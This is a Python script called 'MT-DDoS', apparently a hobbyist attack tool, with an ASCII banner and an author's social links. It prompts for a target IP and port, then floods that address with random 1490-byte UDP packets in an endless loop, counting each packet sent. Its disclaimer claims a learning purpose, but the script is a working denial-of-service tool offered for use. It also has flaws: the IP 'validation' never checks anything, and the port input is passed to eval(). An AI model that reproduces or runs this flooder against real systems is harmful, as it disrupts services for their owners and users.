#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''\033[38;5;156m
		┳┳┓┏┳┓  ┳┓┳┓┏┓┏┓
		┃┃┃ ┃ ━━┃┃┃┃┃┃┗┓
		┛ ┗ ┻   ┻┛┻┛┗┛┗┛ 
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;156m
\033[1;37m┃\033[38;5;196m>>\033[38;5;156m  Owner\033[1;37m:\033[38;5;156m Mr. Tan
\033[1;37m ┃\033[38;5;196m>>\033[38;5;156m Git\033[1;37m:\033[38;5;75m https://github.com/mrtan-official
\033[1;37m  ┃\033[38;5;196m>>\033[38;5;156m Fb\033[1;37m:\033[38;5;75m https://facebook.com/MrT4N.Official
   \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;156m                                                 
\033[1;37m  ┃\033[38;5;196m>>\033[38;5;156m Disclaimer :                           
 \033[1;37m  ┃\033[38;5;196m  1.\033[38;5;156m Don't Use For Personal Revenges          
  \033[1;37m  ┃\033[38;5;196m  2.\033[38;5;156m Author Is Not Responsible For Your Jobs 
   \033[1;37m  ┃\033[38;5;196m  3.\033[38;5;156m Use for learning purposes                
	\033[1;37m  ┃\033[38;5;196m	  4.\033[38;5;156m Does MT suit in villain role, huh?       
  		\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;156m
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" \033[1;37m[\033[38;5;196m+\033[1;37m]\033[38;5;156m Input Target IP : ")
port = eval(input(" \033[1;37m[\033[38;5;196m+\033[1;37m]\033[38;5;156m Starting Port NO : "))
os.system("clear")
print('''\033[38;5;156m
		┳┳┓┏┳┓  ┳┓┳┓┏┓┏┓
		┃┃┃ ┃ ━━┃┃┃┃┃┃┗┓
		┛ ┗ ┻   ┻┛┻┛┗┛┗┛ 
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;156m
\033[1;37m┃\033[38;5;196m>>\033[38;5;156m  Owner\033[1;37m:\033[38;5;156m Mr. Tan
\033[1;37m ┃\033[38;5;196m>>\033[38;5;156m Git\033[1;37m:\033[38;5;75m https://github.com/mrtan-official
\033[1;37m  ┃\033[38;5;196m>>\033[38;5;156m Fb\033[1;37m:\033[38;5;75m https://facebook.com/MrT4N.Official
   \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;156m
	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked.... ")
	print("   \033[1;37m[\033[38;5;196m+\033[1;37m\033[38;5;156m Attack Screen Loading ....")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    That's my secret Cap, I am always angry ")
print(" " )
print(" \033[1;37m[\033[38;5;196m+\033[1;37m]\033[38;5;156m MT-DDoS is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n \033[1;37m[\033[38;5;196m+\033[1;37m]\033[38;5;156m Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n \033[1;37m[\033[38;5;196m-\033[1;37m]\033[38;5;156m Ctrl+C Detected.........Exiting")
	print(" \033[1;37m[\033[38;5;196m-\033[1;37m]\033[38;5;156m DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" \033[1;37m[\033[38;5;196m-\033[1;37m]\033[38;5;156m Dr. Banner is tired...")
